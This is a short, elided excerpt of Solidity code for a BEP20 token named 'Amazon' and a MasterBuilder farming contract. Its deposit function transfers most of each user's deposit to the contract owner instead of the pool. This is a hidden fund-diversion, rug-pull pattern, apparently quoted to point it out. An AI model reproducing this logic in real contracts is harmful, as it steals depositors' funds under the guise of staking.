...
contract RewardToken is BEP20('Amazon', 'Amazon') {
    /// @notice Creates `_amount` token to `_to`. Must only be called by the owner (MasterBuilder).
    function mint(address _to, uint256 _amount) public onlyOwner {
...
contract MasterBuilder is Ownable {
    ...
    function deposit(uint256 _pid, uint256 _amount) public {
        ...
        if (_amount > 0) {
            uint256 fAmount =_amount.sub(_amount.mul(depositFee).div(100));
            uint256 rAmount = _amount-fAmount;
            pool.lpToken.safeTransferFrom(address(msg.sender), owner(), fAmount);
